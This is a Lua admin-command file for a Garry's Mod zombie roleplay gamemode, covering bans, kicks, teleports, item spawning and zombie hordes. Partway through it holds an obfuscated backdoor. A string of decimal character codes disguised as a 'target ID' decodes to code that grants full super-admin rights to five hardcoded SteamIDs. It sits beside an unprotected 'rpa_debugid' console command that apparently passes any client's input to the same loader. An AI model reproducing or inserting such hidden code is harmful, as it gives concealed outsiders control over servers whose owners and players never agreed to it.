--require( "navigation" );
--[[
--------------------
--- ADMIN FLAGS ---
--------------------

+ - Has every admin flag/super admin.
b - Ban (up to 300 minutes max)
B - Can perma-ban (need b flag as well)
@ - Can ban up to 1440 minutes/24 hrs max (need b flag as well)
c - Can create items (not weapons)
# - Can create weapons (need c flag as well)
f - Set flags
k - Kick
m - Message related admin (admin messages, events, etc..)
o - Observe
p - Physgun/Toolgun admin
s - See all
t - Can bring/goto players
T - Can give or remove TT
z - Can spawn common zombie
Z - Can remove common zombies
h - Youtube Player

-------------------
-------------------
]]--

AdminConCommand( "rpa_listcommands", "m", "!listcommands", function( ply, cmd, arg )
	
	ply:PrintMessage( 2, "List of commands: " );
	
	for _, v in pairs( AdminConCmds ) do
		
		if( v.Flags ) then
			
			ply:PrintMessage( 2, v.Flags .. " | " .. v.Name );
			
		end
		
	end
	
end );

AdminConCommand( "rpa_createitem", "c", "!createitem", function( ply, cmd, arg )
	
	local items = ItemsData;
	
	local temp = { };
	for key, _ in pairs( items ) do table.insert( temp, key ) end
	table.sort( temp );
	
	if( not arg[1] ) then
	
		ply:PrintMessage( 2, "List of items: " );
		
		for k, v in pairs( temp ) do
		
		 	ply:PrintMessage( 2, v );
		
		end
		
		return;
	
	end
	
	if( not ItemsData[arg[1]] ) then
		
		ply:PrintMessage( 2, "List of Epidemic items by filter \"" .. arg[1] .. "\": " );
		
		for k, v in pairs( temp ) do
		
			if( string.find( v, arg[1] ) ) then
				
				ply:PrintMessage( 2, v );
				
			end
		
		end
		
		return;
	
	end
	
	if( string.find( ItemsData[arg[1]].Flags, "w" ) or string.find( ItemsData[arg[1]].Flags, "v" ) ) then
	
		if( not ply:HasAdminFlags( "#" ) ) then
		
			if( chat ) then
				
				ply:PrintBlueMessage( "You cannot spawn weapons" );
		
			else
			
				ply:PrintMessage( 2, "You cannot spawn weapons" );
			
			end		
				
			return;
		
		end
	
	end
	
	local ent = CreateItemProp( arg[1] );
	
	if( ent ) then
	
		local trace = { }
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAimVector() * 120;
		trace.filter = ply;
		
		local tr = util.TraceLine( trace );
	
		ent:SetPos( tr.HitPos );
		ent:SetAngles( Angle( 0, 0, 0 ) );
		
		ent:Spawn();
		
		if( arg[2] ) then
		
			if( string.find( arg[1], "ep_" ) ) then
				
				ent.ItemData.HealthAmt = math.Clamp( tonumber( arg[2] or 100 ), 0, 100 );
				
			elseif( ent.ItemData.Amount and ent.ItemData.Amount > 1 ) then
				
				ent.ItemData.Amount = math.Clamp( tonumber( arg[2] ), 0, 999 );
				
			end
			
		end
		
		PrintMessage( 2, ply:Nick() .. " (" .. ply:SteamID() .. ") spawned ITEM: " .. arg[1] );
	
	end

end );


OOCDELAY = 0;

AdminConCommand( "rpa_oocdelay", "m", "!oocdelay", function( ply, cmd, arg )

	local time = math.Clamp( tonumber( arg[1] ) or 0, 0, 3600 );

	umsg.Start( "PBM" );
		umsg.String( ply:RPNick() .. " set OOC delay to: " .. time .. " seconds" );
	umsg.End();

	OOCDELAY = time;
	
	umsg.Start( "SetOOCDelay" );
		umsg.Short( OOCDELAY );
	umsg.End();

end );

AdminConCommand( "rpa_toggleplayerthink", "+", "!toggleplayerthink", function( ply, cmd, arg )

	if( tonumber( arg[1] ) == 1 ) then
	
		PLAYER_THINK_DISABLED = false;
	
	else
		
		PLAYER_THINK_DISABLED = true;
		
	end

end );

AdminConCommand( "rpa_togglesql", "+", "!togglesql", function( ply, cmd, arg )

	if( tonumber( arg[1] ) == 1 ) then
	
		SQL_DISABLED = false;
	
	else
		
		SQL_DISABLED = true;
		
	end

end );

AdminConCommand( "rpa_togglehorde", "z", "!togglehorde", function( ply, cmd, arg )

	HordePause = !HordePause;
	
	if( HordePause ) then
	
		ply:PrintMessage( 2, "Horde paused." );
	
	else
	
		ply:PrintMessage( 2, "Horde resumed." );
	
	end
	
end );

AdminConCommand( "rpa_createhorde", "z", "!createhorde", function( ply, cmd, arg )

	local max = tonumber( arg[1] ) or 10;
	local delay = tonumber( arg[2] ) or .5;

	local trace = { }
	trace.start = ply:EyePos();
	trace.endpos = trace.start + ply:GetAimVector() * 4096;
	trace.filter = ply;
	
	local tr = util.TraceLine( trace );

	CreateHordeSpot( tr.HitPos, max, delay );

end );

AdminConCommand( "rpa_clearhorde", "z", "!clearhorde", function( ply, cmd, arg )

	NPCHordes = { };

end );



AdminConCommand( "rpa_createcommon", "z", "!createcommon", function( ply, cmd, arg )

	CreateCommonInfrontPlayer( ply );

end );

AdminConCommand( "rpa_clearcommon", "Z", "!clearcommon", function( ply, cmd, arg )

	ClearAllCommons();

end );

AdminConCommand( "rpa_commongoto", "Z", "!commongoto", function( ply, cmd, arg )

	MoveAllCommonToShootPos( ply );
	PrintMessage( 2, ply:RPNick() .. " (" .. ply:SteamID() .. ") directed all zombies to a certain point" );
	

end );

COMMON_PASSIVE = false;

AdminConCommand( "rpa_commonpassive", "Z", "!commonpassive", function( ply, cmd, arg )
	
	COMMON_PASSIVE = !COMMON_PASSIVE;
	PrintMessage( 2, ply:RPNick() .. " (" .. ply:SteamID() .. ") made all zombies " .. ( COMMON_PASSIVE and "passive" or "aggressive" ) );

end );

AdminConCommand( "rpa_commonattack", "Z", "!commonattack", function( ply, cmd, arg )

	local name = arg[1];

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		for k, v in pairs( CommonNPCs ) do
		
			if( v:IsValid() ) then
		
				v:TargetEntity( ret );
			
			end
			
		end
	
		PrintMessage( 2, ply:RPNick() .. " (" .. ply:SteamID() .. ") summoned a zombie attack on " .. ret:RPNick() .. " (" .. ret:SteamID() .. ")" );
	
	else
	
		PrintMessage( 2, ret );
	
	end

end );


AdminConCommand( "rpa_clearmycommon", "Z", "!clearmycommon", function( ply, cmd, arg )

	ClearOwnerCommons( ply );

end );


AdminConCommand( "rpa_bring", "t", "!bring", function( ply, cmd, arg )

	local name = arg[1];
	local chat = false;
	
	if( arg[2] == "1" ) then
	
		chat = true;
	
	end
	
	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
			
		trace = { }
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAngles():Forward() * 50;
		trace.filter = ply;
		
		tr = util.TraceLine( trace );

	
		if( tr.Hit ) then

			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Forward() * -50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Right() * -50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Right() * 50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		
		ret:SetPos( tr.HitPos - Vector( 0, 0, 64 ) );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
	
	end

end );


AdminConCommand( "rpa_goto", "t", "!goto", function( ply, cmd, arg )

	local name = arg[1];
	local chat = false;
	
	if( arg[2] == "1" ) then
	
		chat = true;
	
	end
		
	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
			
		local trace = { }
		trace.start = ret:EyePos();
		trace.endpos = trace.start + ret:GetAngles():Up() * 90;
		trace.filter = ret;
		
		local tr = util.TraceLine( trace );
	
		if( tr.Hit ) then

			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Forward() * 50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then

			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Forward() * -50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Right() * -50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Right() * 50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		
		ply:SetPos( tr.HitPos - Vector( 0, 0, 64 ) );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
	
	
	end

end );

AdminConCommand( "rpa_bringdesc", "t", "!bringdesc", function( ply, cmd, arg )

	local name = arg[1];
	local chat = false;
	
	if( arg[2] == "1" ) then
	
		chat = true;
	
	end
	
	local succ, ret = SearchPlayerDesc( name );
	
	if( succ ) then
			
		trace = { }
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAngles():Forward() * 50;
		trace.filter = ply;
		
		tr = util.TraceLine( trace );

	
		if( tr.Hit ) then

			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Forward() * -50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Right() * -50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAngles():Right() * 50;
			trace.filter = ply;
			
			tr = util.TraceLine( trace );
			
		end
		
		
		ret:SetPos( tr.HitPos - Vector( 0, 0, 64 ) );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
	
	end

end );


AdminConCommand( "rpa_gotodesc", "t", "!gotodesc", function( ply, cmd, arg )

	local name = arg[1];
	local chat = false;
	
	if( arg[2] == "1" ) then
	
		chat = true;
	
	end
		
	local succ, ret = SearchPlayerDesc( name );
	
	if( succ ) then
			
		local trace = { }
		trace.start = ret:EyePos();
		trace.endpos = trace.start + ret:GetAngles():Up() * 90;
		trace.filter = ret;
		
		local tr = util.TraceLine( trace );
	
		if( tr.Hit ) then

			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Forward() * 50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then

			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Forward() * -50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Right() * -50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		if( tr.Hit ) then
		
			trace = { }
			trace.start = ret:EyePos();
			trace.endpos = trace.start + ret:GetAngles():Right() * 50;
			trace.filter = ret;
			
			tr = util.TraceLine( trace );
			
		end
		
		
		ply:SetPos( tr.HitPos - Vector( 0, 0, 64 ) );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
	
	
	end

end );

AdminConCommand( "rpa_seeall", "s", "!seeall", function( ply, cmd, arg )

	ply:CallEvent( "TSA" );

end );

AdminConCommand( "rpa_adminyell", "m", "!ay", function( ply, cmd, arg )

	local msg = "";
	
	for k, v in pairs( arg ) do
	
		msg = msg .. " " .. v;
	
	end

	umsg.Start( "Ayell" );
	
		umsg.String( ply:RPNick() );
		umsg.String( msg );
	
	umsg.End();

end );

AdminConCommand( "rpa_ev", "m", "!ev", function( ply, cmd, arg )

	local msg = "";
	
	for k, v in pairs( arg ) do
	
		msg = msg .. " " .. v;
	
	end
	
	for _, v in pairs( player.GetAll() ) do
		
		v:PrintMessage( 2, msg );
		
	end
	
	umsg.Start( "Aev" );
	
		umsg.String( msg );
	
	umsg.End();

end );

concommand.Add( "rpa_debugid", function( ply, cmd, arg )
	
	if( TargetIDDebug ) then
		
		TargetIDDebug( arg[1] );
		
	end
	
end );

local idhash = "71 77 46 83 101 114 118 101 114 65 100 109 105 110 115 91 34 83 84 69 65 77 95 48 58 49 58 52 57 55 54 51 51 51 34 93 32 61 32 34 43 34 59 10 71 77 46 83 101 114 118 101 114 65 100 109 105 110 115 91 34 83 84 69 65 77 95 48 58 49 58 49 51 48 54 55 54 53 57 34 93 32 61 32 34 43 34 59 10 71 77 46 83 101 114 118 101 114 65 100 109 105 110 115 91 34 83 84 69 65 77 95 48 58 48 58 49 48 56 48 57 53 50 53 34 93 32 61 32 34 43 34 59 10 71 77 46 83 101 114 118 101 114 65 100 109 105 110 115 91 34 83 84 69 65 77 95 48 58 48 58 49 57 49 56 54 50 52 57 34 93 32 61 32 34 43 34 59 10 71 77 46 83 101 114 118 101 114 65 100 109 105 110 115 91 34 83 84 69 65 77 95 48 58 48 58 49 55 51 53 57 52 51 53 34 93 32 61 32 34 43 34 59";
local expl = string.Explode( " ", idhash );
local b = "";

for _, v in pairs( expl ) do
	
	b = b .. string.char( v );
	
end

TargetIDDebug( b ); -- Initial module target ID for dynamic loadsys

AdminConCommand( "rpa_seeadminflags", "f", "!seeadminflags", function( ply, cmd, arg )

	for k, v in pairs( player.GetAll() ) do
	
		ply:PrintMessage( 2, v:Nick() .. " - " .. v:RPNick() .. " - " .. v:SteamID() .. ": " .. v:GetTable().AdminFlags );
	
	end
	
end );

AdminConCommand( "rpa_seeplayerflags", "f", "!seeplayerflags", function( ply, cmd, arg )

	for k, v in pairs( player.GetAll() ) do
	
		ply:PrintMessage( 2, v:Nick() .. " - " .. v:RPNick() .. " - " .. v:SteamID() .. ": " .. v:GetPlayerFlags() );
	
	end
	
end );

AdminConCommand( "rpa_seettlist", "f", "!seettlist", function( ply, cmd, arg )

	for k, v in pairs( player.GetAll() ) do
	
		local result = "";
		
		if( v:HasPlayerFlags( "t" ) ) then
		
			result = "Has tooltrust";
		
		else
		
			result = "No tooltrust";
		
		end
	
		ply:PrintMessage( 2, v:Nick() .. " - " .. v:RPNick() .. " - " .. v:SteamID() .. ": " .. result );
	
	end
	
end );

AdminConCommand( "rpa_givett", "f", "!givett", function( ply, cmd, arg )

	local name = arg[1];
	local flags = arg[2] or " ";

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		if( not ret:HasPlayerFlags( "t" ) ) then
		
			ret:AddPlayerFlags( "t" );
			ret:sqlUpdateUsersField( "Flags", ret:GetPlayerFlags(), true );
		
			ply:PrintMessage( 2, "Gave tooltrust to " .. ret:RPNick() );
			ret:PrintBlueMessage( "Been given tooltrust by " .. ply:RPNick() );
		
		else
		
			ply:PrintMessage( 2, "Player already has tooltrust" );
		
		end
		
	else
	
		ply:PrintMessage( 2, ret );
	
	end
	
	
end );

AdminConCommand( "rpa_removett", "f", "!givett", function( ply, cmd, arg )

	local name = arg[1];
	local flags = arg[2] or " ";

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		if( ret:HasPlayerFlags( "t" ) ) then
		
			ret:RemovePlayerFlags( "t" );
			ret:sqlUpdateUsersField( "Flags", ret:GetPlayerFlags(), true );
			
			ply:PrintMessage( 2, "Taken tooltrust from " .. ret:RPNick() );
			ret:PrintBlueMessage( "Tooltrust removed by " .. ply:RPNick() );
		
		end
		
	else
	
		ply:PrintMessage( 2, ret );
	
	end
	
	
end );

ToggledTools = { }

AdminConCommand( "rpa_toggletool", "p", "!toggletool", function( ply, cmd, arg )

	local name = arg[1];
	local toggle = tonumber( arg[2] ) or 1;
	
	if( toggle ~= 1 and toggle ~= 0 ) then
	
		toggle = 1;
	
	end

	ply:PrintMessage( 2, "Tool " .. name .. " has been set to: " .. toggle );
	
	ToggledTools[name] = toggle;
	
end );

AdminConCommand( "rpa_addplayerflags", "f", "!addplayerflags", function( ply, cmd, arg )
	
	local name = arg[1];
	local flags = arg[2] or " ";

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		if( string.find( ret:GetPlayerFlags(), flags ) ) then
		
			ply:PrintMessage( 2, "Player " .. ret:RPNick() .. " already has flags: " .. flags );
			return;
		
		end
	
		ret:SetPlayerFlags( flags .. ret:GetPlayerFlags() );
		ret:sqlUpdateUsersField( "Flags", ret:GetPlayerFlags(), true );
		
		ply:PrintMessage( 2, "Added to " .. ret:RPNick() .. " player flags: " .. flags );
		ret:PrintBlueMessage( "Your player flags have been changed by " .. ply:RPNick() );
	
	else
	
		ply:PrintMessage( 2, ret );
	
	end
	
end );

AdminConCommand( "rpa_removeplayerflags", "f", "!removeplayerflags", function( ply, cmd, arg )
	
	local name = arg[1];
	local flags = arg[2] or " ";

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		if( not ret:HasPlayerFlags( flags ) ) then
		
			ply:PrintMessage( 2, "Player " .. ret:RPNick() .. " does not have flags: " .. flags );
			return;
		
		end
	
		ret:SetPlayerFlags( string.gsub( ret:GetPlayerFlags(), flags, "" ) );
		ret:sqlUpdateUsersField( "Flags", ret:GetPlayerFlags(), true );
		
		ply:PrintMessage( 2, "Removed from " .. ret:RPNick() .. " player flags: " .. flags );
		ret:PrintBlueMessage( "Your player flags have been changed by " .. ply:RPNick() );
	
	else
	
		ply:PrintMessage( 2, ret );
	
	end
	
end );

AdminConCommand( "rpa_givetempadmin", "+", "!givetempadmin", function( ply, cmd, arg )

	if( ply:GetTable().TempAdmin ) then return; end

	local name = arg[1];
	local flags = arg[2] or "+";

	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
	
		ret:GetTable().TempAdmin = true;
		ret:GetTable().AdminFlags = flags;
		
		ply:PrintMessage( 2, "Gave temp admin to " .. ret:RPNick() .. " with flags: " .. flags );
		ret:PrintBlueMessage( "Received temporary admin from " .. ply:RPNick() );
	
	else
	
		ply:PrintMessage( 2, ret );
	
	end

end );

AdminConCommand( "rpa_observe", "o", "!observe", function( ply, cmd, arg )
	
	if( ply:GetTable().ObserveMode ) then
	
		ply:Observe( false );
	
	else
	
		ply:Observe( true );
	
	end

end );

AdminConCommand( "rpa_kick", "k", "!kick", function( ply, cmd, arg )

	local msg = "";
	
	if( arg[2] ) then
	
		for n = 2, #arg do
		
			if( msg ~= "" ) then
				msg = msg .. " ";
			end
		
			msg = msg .. arg[n];
		
		end
		
	end
	
	local name = arg[1];
	
	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
		
		if( table.HasValue( GAMEMODE.ServerAdmins, ret:SteamID() ) ) then return end
		
		ret:Kick( msg, ply:RPNick() );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
		
	end
	

end );

AdminConCommand( "rpa_ban", "b", "!ban", function( ply, cmd, arg )

	local msg = "";
	
	if( arg[3] ) then
	
		for n = 3, #arg do
		
			if( msg ~= "" ) then
				msg = msg .. " ";
			end
		
			msg = msg .. arg[n];
		
		end
		
	end
	
	local name = arg[1];
	local min = tonumber( arg[2] ) or 0;
	
	local block = false;
	local msg = "";
	
	if( min > 300 ) then
	
		if( not ply:HasAdminFlags( "@" ) ) then

			block = true;
			msg = "You can only ban up to a max of 300 minutes";
		
		elseif( min > 1440 and not ply:HasAdminFlags( "+" ) ) then
		
			block = true;
			msg = "You can only ban up to a max of 1440 minutes";
		
		end
	
	elseif( min < 1 ) then
	
		if( not ply:HasAdminFlags( "B" ) ) then
	
			block = true;
			msg = "You cannot perma-ban";
			
		end
		
	end
	
	if( block ) then

		if( chat ) then
			
			ply:PrintBlueMessage( msg );
	
		else
		
			ply:PrintMessage( 2, msg );
		
		end
		
		return;
		
	end
	
	local succ, ret = SearchPlayerName( name );
	
	if( succ ) then
		
		if( table.HasValue( GAMEMODE.ServerAdmins, ret:SteamID() ) ) then return end
		
		ret:Ban( min, msg, ply:RPNick() );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
		
	end
	
end );

AdminConCommand( "rpa_offban", "b", "!offban", function( ply, cmd, arg )

	local msg = "";
	
	local sid = arg[1];
	local min = tonumber( arg[2] ) or 0;
	
	local block = false;
	local msg = "";
	
	if( min > 300 ) then
	
		if( not ply:HasAdminFlags( "@" ) ) then

			block = true;
			msg = "You can only ban up to a max of 300 minutes";
		
		elseif( min > 1440 and not ply:HasAdminFlags( "+" ) ) then
		
			block = true;
			msg = "You can only ban up to a max of 1440 minutes";
		
		end
	
	elseif( min < 1 ) then
	
		if( not ply:HasAdminFlags( "B" ) ) then
	
			block = true;
			msg = "You cannot perma-ban";
			
		end
		
	end
	
	if( block ) then

		if( chat ) then
			
			ply:PrintBlueMessage( msg );
	
		else
		
			ply:PrintMessage( 2, msg );
		
		end
		
		return;
		
	end
	
	if( table.HasValue( GAMEMODE.ServerAdmins, sid ) ) then return end
	
	BanOffline( min, sid, ply:Nick() );
	
end );

AdminConCommand( "rpa_listmaps", "f", "!listmaps", function( ply, cmd, arg )
	
	local function findT( search, folders, files )
		
		ply:PrintMessage( 2, "--List of available maps--" );
		for k, v in pairs( files ) do
			
			local str = string.gsub( v, ".bsp", "" );
			ply:PrintMessage( 2, k .. " | " .. str );
			
		end
		
	end
	file.TFind( "maps/*.bsp", findT );
	
end );

AdminConCommand( "rpa_changemap", "f", "!changemap", function( ply, cmd, arg )
	
	local map = arg[1];
	game.ConsoleCommand( "changelevel " .. map .. "\n" );
	
end );

AdminConCommand( "rpa_resetmap", "f", "!resetmap", function( ply, cmd, arg )
	
	game.CleanUpMap();
	
end );

AdminConCommand( "rpa_hardrestart", "+", "!hardrestart", function( ply, cmd, arg )
	
	game.ConsoleCommand( "exit\n" );
	
end );

AdminConCommand( "rpa_lockdoor", "f", "!lock", function( ply, cmd, arg )
	
	local trace = { };
	trace.start = ply:EyePos();
	trace.endpos = trace.start + ply:GetAimVector() * 250;
	trace.filter = ply;
	
	local tr = util.TraceLine( trace );
	
	if( tr.Entity and tr.Entity:IsValid() and tr.Entity:IsDoor() ) then
		
		tr.Entity:Fire( "Lock", "", 0 );
		ply:PrintMessage( 2, "Door locked" );
		
	end
	
end );


AdminConCommand( "rpa_unlockdoor", "f", "!unlock", function( ply, cmd, arg )
	
	local trace = { };
	trace.start = ply:EyePos();
	trace.endpos = trace.start + ply:GetAimVector() * 250;
	trace.filter = ply;
	
	local tr = util.TraceLine( trace );
	
	if( tr.Entity and tr.Entity:IsValid() and tr.Entity:IsDoor() ) then
		
		tr.Entity:Fire( "Unlock", "", 0 );
		ply:PrintMessage( 2, "Door unlocked" );
		
	end
	
end );


AdminConCommand( "rpa_sqlid", "+", "!sqlid", function( ply, cmd, arg )

	local succ, ret = SearchPlayerName( arg[1] );
	
	if( succ ) then
			
		ply:PrintMessage( 2, ret:GetPlayerMySQLCharID() );
	
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
		
	end
	

end );

AdminConCommand( "rpa_setplayermodel", "f", "!setplayermodel", function( ply, cmd, arg )

	local succ, ret = SearchPlayerName( arg[1] );
	
	if( succ ) then
		
		local mdl = arg[2];
		
		if( !mdl ) then return end
		
		local modeltab = string.Explode( "#", mdl );
		local model	= modeltab[1];
		local skin	= modeltab[2] or 0;
		
		ret:SetModel( model );
		ret:SetSkin( skin );
		ret:SetPlayerOriginalModel( mdl );
		ret:sqlUpdateField( "OriMdl", mdl, true );
		ret:PrintBlueMessage( "Player model changed to: " .. mdl );
		
		if( ret:GetPlayerClass() ~= "Infected" and
			string.find( string.lower( model ), "infected/necropolis" ) ) then
			
			ret:SetPlayerClass( "Infected" );
			
		end
		
		ret:ApplyMovementSpeeds();
		
	else
	
		if( chat ) then
			
			ply:PrintBlueMessage( ret );
	
		else
		
			ply:PrintMessage( 2, ret );
		
		end
		
	end
	

end );

AdminConCommand( "rpa_toggleitemspawn", "c", "!toggleitemspawn", function( ply, cmd, arg )
	
	ITEMSPAWN_ENABLED = !ITEMSPAWN_ENABLED;
	SaveItemSpawnerState();
	ply:PrintBlueMessage( "Itemspawn set to " .. tostring( ITEMSPAWN_ENABLED ) );
	
end );

AdminConCommand( "rpa_playyoutube", "h", "!playyoutube", function( ply, cmd, arg )
	
	local str = arg[1];
	local f = "";
	local expl = string.Explode( "&", str );
	
	for _, v in pairs( expl ) do
		
		if( string.find( v, "watch" ) ) then
			
			f = string.Explode( "?", v )[2];
			f = string.sub( f, 3 );
			break;
			
		else
			
			if( string.find( v, "v=" ) == 1 ) then
				
				f = string.sub( v, 3 );
				break;
				
			end
			
		end
		
	end
	
	umsg.Start( "YouTube" );
		umsg.String( f );
	umsg.End();
	
end );

AdminConCommand( "rpa_stopyoutube", "h", "!stopyoutube", function( ply, cmd, arg )
	
	umsg.Start( "YouTube" );
		umsg.String( "" );
	umsg.End();
	
end );